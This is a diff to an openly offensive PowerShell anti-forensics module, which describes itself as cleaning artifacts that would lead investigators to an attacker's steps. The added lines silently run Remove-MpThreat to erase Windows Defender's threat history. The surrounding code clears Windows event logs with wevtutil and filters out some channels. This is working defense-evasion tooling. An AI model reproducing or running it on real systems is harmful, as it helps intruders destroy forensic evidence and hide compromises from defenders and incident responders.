@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    Cover tracks \ Clean artifacts {anti-forensic}
 
@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: cmd.exe {native}
    Optional Dependencies: wevtutil {native}
-   PS cmdlet Dev version: v2.3.15
+   PS cmdlet Dev version: v2.3.16
 
 .DESCRIPTION
    Module to clean artifacts that migth lead forensic investigatores to attacker steps.
@@ -395,6 +395,8 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
             Write-Host "    Warning : Please wait while we clean Eventvwr." -ForegroundColor Yellow
          }
 
+         #Remove threats from defender vault
+         Try{Remove-MpThreat}Catch{}
 
          $PSlist = wevtutil el | Where-Object {#Note: wevtutil cl => requires Administrator rigths to run
             $_ -iNotMatch '(Intel|Windows-Audio|Windows-Defrag|Windows-Kernel|Windows-Crypto|Windows-LiveId/Analytic|Windows-LiveId/Operational|Windows-USBVideo/Analytic|/Admin$)'
